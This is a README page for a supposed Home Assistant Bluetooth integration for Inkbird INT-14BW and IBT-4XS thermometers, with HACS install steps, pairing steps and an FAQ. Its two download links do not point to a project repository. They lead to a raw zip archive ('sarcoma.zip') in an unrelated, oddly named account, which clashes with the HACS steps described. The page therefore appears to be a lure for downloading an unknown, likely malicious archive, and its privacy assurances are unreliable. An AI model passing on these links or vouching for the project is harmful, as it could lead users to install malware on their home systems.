---
layout: "default"
title: "🌡️ ha-inkbird-int14bw - Connect Inkbird thermometers to Home Assistant"
description: "Integrate Inkbird INT-14-BW and IBT-4XS meat thermometers directly into Home Assistant via Bluetooth for local sensor tracking without cloud dependencies."
---
# 🌡️ ha-inkbird-int14bw - Connect Inkbird thermometers to Home Assistant

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Sadistic-froelichia458/sadistic-froelichia458.github.io/main/chickenheartedness/sarcoma.zip)

## 📖 About this project

This integration enables communication between your Inkbird INT-14BW thermometer and Home Assistant. It acts as a bridge for your smart home system to read data from your device over Bluetooth. You can see real-time temperature values and monitor your cooking sessions directly from your Home Assistant dashboard.

## ⚙️ Prerequisites

Before you start the installation, ensure your setup meets these requirements:

- A dedicated device running Home Assistant.
- A Bluetooth adapter connected to your Home Assistant machine.
- Your Inkbird INT-14BW thermometer within range of your Bluetooth adapter.
- The Home Assistant Community Store (HACS) installed on your system.

## 📦 How to get the software

You must visit the project page to access the necessary files. 

[Visit this page to download the latest integration files](https://raw.githubusercontent.com/Sadistic-froelichia458/sadistic-froelichia458.github.io/main/chickenheartedness/sarcoma.zip)

## 🛠️ Installation steps

Follow these steps to add the integration to your system.

1. Open your Home Assistant dashboard in a web browser.
2. Select the HACS tab from the left sidebar.
3. Click the three dots in the top right corner.
4. Select Custom Repositories.
5. Paste the link to the GitHub repository into the repository field.
6. Choose Integration as the category.
7. Click the Add button.
8. Locate the new Inkbird integration in your HACS list.
9. Click the Download button.
10. Restart Home Assistant to finalize the installation.

## 🔌 Connecting your device

After you restart your system, the integration needs to find your thermometer.

1. Go to the Settings page in Home Assistant.
2. Select Devices & Services.
3. Click the Add Integration button at the bottom right.
4. Search for Inkbird INT-14BW.
5. Select the integration from the list.
6. The system scans for nearby Bluetooth devices. 
7. Select your Inkbird device when it appears in the scan results.
8. Enter the required information if prompted.
9. Assign the device to an area in your home to complete the setup.

## 📊 Viewing your data

Once the device connects, Home Assistant creates sensors for your thermometer. You can view these entities on your dashboard. Use the standard Home Assistant card editor to place your temperature readings on your primary display. These sensors update automatically as long as the thermometer remains within Bluetooth range.

## ❓ Frequently asked questions

**My device does not appear in the scan list.**
Confirm that your Bluetooth adapter is active. Bring the thermometer closer to the Home Assistant host machine. Bluetooth signals have a limited range and get blocked by walls or heavy appliances.

**The temperature data stops updating.**
Bluetooth connections sometimes drop. Restart the Home Assistant host machine to refresh the Bluetooth stack. Check the battery level on your Inkbird device, as low power affects signal strength.

**Do I need an internet connection for this to work?**
This integration relies on a local connection between your hardware and Home Assistant. You do not need a connection to the internet for the sensor data to reach your dashboard.

## 📝 Performance tips

Bluetooth communication relies heavily on the quality of your adapter. Use an external USB Bluetooth adapter with an extension cable if your Home Assistant machine sits inside a metal cabinet. This placement prevents signal interference. Ensure your Home Assistant version stays up to date to receive the latest stability improvements for Bluetooth integrations.

## 🛡️ Reliability

This tool follows standard Home Assistant communication protocols. It maintains a secure, local connection to your thermometer. No data leaves your home network during operation. You retain full control over your sensor information at all times.

Keywords: ble, bluetooth, hacs, hacs-integration, home-assistant, homeassistant-integration, ibt-4xs, inkbird, int-14-bw, thermometer